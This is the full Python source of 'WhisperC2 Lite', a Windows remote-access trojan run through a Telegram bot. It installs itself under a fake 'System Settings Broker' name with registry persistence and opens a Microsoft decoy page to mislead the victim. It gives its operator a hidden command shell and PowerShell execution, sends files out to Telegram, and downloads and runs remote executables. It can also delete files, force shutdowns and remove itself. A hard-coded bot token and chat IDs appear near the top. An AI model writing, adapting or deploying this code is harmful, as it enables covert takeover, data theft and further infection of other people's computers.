#!/usr/bin/env python3
# =============================================================================
# WhisperC2 Lite – Stealth, No Keylogger, No Webcam, No Screenshot
# =============================================================================
import telebot, platform, subprocess, threading, time, os, sys, io, traceback, webbrowser, locale
import shutil, winreg, ctypes, requests
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse
import random, string

# -----------------------------------------------------------------------------
# Configuration
# -----------------------------------------------------------------------------
BOT_API_KEY = "8318891177:AAG8SB7YI_YAQHL2cszd4fKFK8Xp9-7u-JY"
OPERATOR_CHAT_ID = 5178265082
GROUP_CHAT_ID = -1003972714956
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# Single‑instance mutex
# -----------------------------------------------------------------------------
MUTEX_NAME = "Global\\WhisperLite_Mutex"
mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
if ctypes.windll.kernel32.GetLastError() == 183:
    sys.exit(0)

# -----------------------------------------------------------------------------
# Runtime log buffer
# -----------------------------------------------------------------------------
log_lines = []

def log(msg: str) -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_lines.append(f"[{timestamp}] {msg}")
    print(f"* {msg}")

def send_log_to_telegram(bot_instance) -> None:
    if not log_lines:
        return
    try:
        log_text = "\n".join(log_lines)
        bio = io.BytesIO(log_text.encode('utf-8'))
        bio.name = "Execution_log.txt"
        bio.seek(0)
        bot_instance.send_document(OPERATOR_CHAT_ID, bio)
        log("Log delivered")
    except Exception as e:
        print(f"Failed to send log: {e}")

bot = telebot.TeleBot(BOT_API_KEY)

# -----------------------------------------------------------------------------
# Agent identification & persistence
# -----------------------------------------------------------------------------
appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
os.makedirs(agents_dir, exist_ok=True)

def get_system_id() -> str:
    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
    if '\\' in raw_user:
        username = raw_user.split('\\', 1)[1]
    else:
        username = raw_user
    return f"{hostname}/{username}"

SYSTEM_ID = get_system_id()

def install_persistence() -> bool:
    if not getattr(sys, 'frozen', False):
        log("Persistence skipped – script mode")
        return False
    try:
        dest_path = Path(agents_dir) / 'SystemSettingsBroker.exe'
        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
        if current.resolve() == dest_path.resolve():
            return True
        if not dest_path.exists():
            try:
                shutil.copy2(current, dest_path)
            except PermissionError:
                log("Copy skipped")
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'System Settings Broker', 0, winreg.REG_SZ, str(dest_path))
        return True
    except Exception as e:
        log(f"Persistence error: {traceback.format_exc()}")
        return False

def self_destruct() -> None:
    log("Self‑destruct started")
    try:
        persistent = Path(agents_dir) / 'SystemSettingsBroker.exe'
        if persistent.exists():
            persistent.unlink()
    except Exception:
        pass
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            try:
                winreg.DeleteValue(key, 'System Settings Broker')
            except FileNotFoundError:
                pass
    except Exception:
        pass
    try:
        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
        if current.exists():
            MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
            ctypes.windll.kernel32.MoveFileExW(str(current), None, MOVEFILE_DELAY_UNTIL_REBOOT)
    except Exception:
        pass

# -----------------------------------------------------------------------------
# Interactive Shell (pipes with PeekNamedPipe)
# -----------------------------------------------------------------------------
shell_active = False
shell_stdin = None
shell_process = None

def spawn_shell() -> bool:
    global shell_active, shell_stdin, shell_process
    if shell_active:
        return True
    try:
        sa = ctypes.wintypes.SECURITY_ATTRIBUTES()
        sa.nLength = ctypes.sizeof(sa)
        sa.bInheritHandle = True
        sa.lpSecurityDescriptor = None

        h_stdin_r, h_stdin_w = ctypes.wintypes.HANDLE(), ctypes.wintypes.HANDLE()
        h_stdout_r, h_stdout_w = ctypes.wintypes.HANDLE(), ctypes.wintypes.HANDLE()

        if not ctypes.windll.kernel32.CreatePipe(ctypes.byref(h_stdin_r), ctypes.byref(h_stdin_w), ctypes.byref(sa), 0):
            return False
        if not ctypes.windll.kernel32.CreatePipe(ctypes.byref(h_stdout_r), ctypes.byref(h_stdout_w), ctypes.byref(sa), 0):
            return False

        si = ctypes.wintypes.STARTUPINFO()
        si.cb = ctypes.sizeof(si)
        si.dwFlags = 0x100
        si.hStdInput = h_stdin_r
        si.hStdOutput = h_stdout_w
        si.hStdError = h_stdout_w

        pi = ctypes.wintypes.PROCESS_INFORMATION()
        cmd_line = ctypes.create_unicode_buffer("cmd.exe")
        if not ctypes.windll.kernel32.CreateProcessW(None, cmd_line, None, None, True, 0x08000000, None, None, ctypes.byref(si), ctypes.byref(pi)):
            return False

        ctypes.windll.kernel32.CloseHandle(h_stdin_r)
        ctypes.windll.kernel32.CloseHandle(h_stdout_w)
        ctypes.windll.kernel32.CloseHandle(pi.hThread)

        shell_stdin = h_stdin_w
        shell_process = pi.hProcess
        shell_active = True
        threading.Thread(target=shell_reader, args=(h_stdout_r,), daemon=True).start()
        return True
    except Exception as e:
        log(f"Shell spawn error: {e}")
        return False

def shell_reader(h_stdout_r) -> None:
    buf = ctypes.create_string_buffer(4096)
    avail = ctypes.wintypes.DWORD()
    code_page = locale.getpreferredencoding(do_setlocale=False)

    while shell_active:
        if not ctypes.windll.kernel32.PeekNamedPipe(h_stdout_r, None, 0, None, ctypes.byref(avail), None):
            break
        if avail.value > 0:
            n = ctypes.wintypes.DWORD()
            if ctypes.windll.kernel32.ReadFile(h_stdout_r, buf, 4096, ctypes.byref(n), None) and n.value > 0:
                output = buf.raw[:n.value].decode(code_page, errors='replace').replace('```', "'''")
                for chunk in [output[i:i+3900] for i in range(0, len(output), 3900)]:
                    try:
                        bot.send_message(OPERATOR_CHAT_ID, f"```\n{chunk}\n```", parse_mode='Markdown')
                    except:
                        bot.send_message(OPERATOR_CHAT_ID, chunk)
            else:
                break
        else:
            time.sleep(0.1)

def kill_shell() -> None:
    global shell_active, shell_stdin, shell_process
    shell_active = False
    try:
        ctypes.windll.kernel32.TerminateProcess(shell_process, 0)
        ctypes.windll.kernel32.CloseHandle(shell_stdin)
        ctypes.windll.kernel32.CloseHandle(shell_process)
    except:
        pass

def write_shell(cmd: str) -> None:
    if shell_active and shell_stdin:
        cmd_line = (cmd + "\r\n").encode()
        n = ctypes.wintypes.DWORD()
        ctypes.windll.kernel32.WriteFile(shell_stdin, cmd_line, len(cmd_line), ctypes.byref(n), None)

# -----------------------------------------------------------------------------
# System command execution
# -----------------------------------------------------------------------------
def sys_cmd(cmd: str) -> str:
    try:
        out = subprocess.getstatusoutput(cmd)[1]
        return out[:4000] if len(out) > 4000 else out
    except Exception as e:
        return f"Error: {e}"

def ps_cmd(cmd: str) -> str:
    try:
        out = subprocess.getstatusoutput(f"powershell -Command {cmd}")[1]
        return out[:4000] if len(out) > 4000 else out
    except Exception as e:
        return f"Error: {e}"

def view_file(path: str) -> str:
    try:
        if not os.path.exists(path): return "Not found"
        if os.path.isdir(path): return "Is a directory"
        if os.path.getsize(path) > 10*1024*1024: return "Too large"
        with open(path, 'r', errors='ignore') as f:
            c = f.read()[:4000]
        return c
    except Exception as e:
        return f"Error: {e}"

def download_file_fs(path: str):
    if not os.path.exists(path): return None, "Not found"
    if os.path.isdir(path): return None, "Is a directory"
    if os.path.getsize(path) > 50*1024*1024: return None, "Too large"
    return path, None

# -----------------------------------------------------------------------------
# DEX (download & execute)
# -----------------------------------------------------------------------------
def dex(url, *args):
    if not url: return "Usage: dex <url> [args...]"
    p = urlparse(url)
    if p.scheme not in ('http','https'): return "Invalid scheme"
    name = ''.join(random.choices(string.ascii_letters+string.digits, k=8)) + (os.path.splitext(p.path)[1] or ".exe")
    dest = os.path.join(os.environ.get('TEMP','.'), name)
    try:
        r = requests.get(url, stream=True, timeout=30)
        r.raise_for_status()
        with open(dest, 'wb') as f:
            for c in r.iter_content(8192):
                if c: f.write(c)
    except Exception as e:
        return f"Download failed: {e}"
    try:
        cmd = f'"{dest}"'
        if args: cmd += ' ' + ' '.join(args)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=0x08000000)
        try:
            out, err = proc.communicate(timeout=15)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, err = proc.communicate()
            return "Timed out"
        output = (out.strip() + "\n" + err.strip()).strip() or "[No output]"
        return f"Executed: {dest}\nExit: {proc.returncode}\n{output}"
    except Exception as e:
        return f"Execution error: {e}"
    finally:
        try:
            ctypes.windll.kernel32.MoveFileExW(dest, None, 0x4)
        except:
            pass

# -----------------------------------------------------------------------------
# Command dispatcher
# -----------------------------------------------------------------------------
def execute_command(cmd_line: str) -> tuple:
    parts = cmd_line.strip().split(' ', 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    if cmd in ("ping","start","scan"):
        return f"🟢 {SYSTEM_ID} online\n{platform.system()} {platform.release()}", None
    elif cmd == "shell":
        if args:
            return sys_cmd(args).replace('```',"'''"), None
        else:
            if spawn_shell():
                return "💬 Interactive shell started. Type `exit` to close.", None
            else:
                return "❌ Failed to spawn shell.", None
    elif cmd in ("powershell","pow"):
        if not args: return "Usage: powershell <command>", None
        return ps_cmd(args).replace('```',"'''"), None
    elif cmd in ("download","downloadfile"):
        path, err = download_file_fs(args.strip())
        if err: return err, None
        return f"⬆️ Uploading {args.strip()}", path
    elif cmd == "delete":
        try:
            os.remove(args.strip())
            return f"🗑️ Deleted: {args.strip()}", None
        except Exception as e:
            return f"❌ Delete failed: {e}", None
    elif cmd in ("view","viewfile"):
        return view_file(args.strip()).replace('```',"'''"), None
    elif cmd == "dex":
        sp = args.find(' ')
        if sp == -1:
            url = args; extra = ()
        else:
            url = args[:sp]; extra = tuple(args[sp+1:].split())
        return dex(url, *extra).replace('```',"'''"), None
    elif cmd == "die":
        log("Die received")
        try: send_log_to_telegram(bot)
        except: pass
        self_destruct()
        return "💀 Shutting down...", None
    elif cmd == "off":
        try:
            subprocess.run(["shutdown","/s","/t","0","/f"], check=True)
        except Exception as e:
            return f"❌ Shutdown failed: {e}", None
        return "🔌 Shutting down PC...", None
    else:
        return f"❓ Unknown: {cmd}", None

# -----------------------------------------------------------------------------
# Telegram handler
# -----------------------------------------------------------------------------
TOPIC_ID = None

def message_handler(message) -> None:
    if message.from_user.id != OPERATOR_CHAT_ID:
        return
    if hasattr(message, 'message_thread_id') and message.message_thread_id is None:
        return

    text = message.text.strip()
    if not text:
        return

    if shell_active:
        clean = text[1:] if text.startswith('/') else text
        if clean.lower() == "exit":
            kill_shell()
            bot.reply_to(message, "💬 Shell closed.", parse_mode='Markdown', message_thread_id=TOPIC_ID)
        elif clean.lower().startswith("die"):
            kill_shell()
            execute_command("die")
        else:
            write_shell(clean)
        return

    if text.startswith('/'): text = text[1:]
    response, file_path = execute_command(text)

    if text.startswith("die"):
        bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', message_thread_id=TOPIC_ID)
        os._exit(0)

    try:
        bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', message_thread_id=TOPIC_ID)
    except:
        bot.reply_to(message, response, message_thread_id=TOPIC_ID)

    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as f:
                bot.send_document(message.chat.id, f, message_thread_id=TOPIC_ID)
        except Exception as e:
            log(f"File send error: {e}")
            bot.reply_to(message, f"Error: {e}", message_thread_id=TOPIC_ID)
        finally:
            try: os.remove(file_path)
            except: pass

bot.message_handler(func=lambda msg: True)(message_handler)

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    log("Agent starting")
    if not install_persistence():
        log("Persistence failed – continuing")
    else:
        log("Persistence installed")

    log(f"Agent ID: {SYSTEM_ID}")

    try:
        new_topic = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0x6FB9F0)
        TOPIC_ID = new_topic.message_thread_id
        log(f"Topic #{TOPIC_ID} created")
    except Exception as e:
        log(f"Topic creation failed: {e}")

    send_log_to_telegram(bot)
    webbrowser.open(DECOY_URL)

    log("Polling...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=30)
        except Exception as e:
            log(f"Polling error: {e}")
            time.sleep(10)
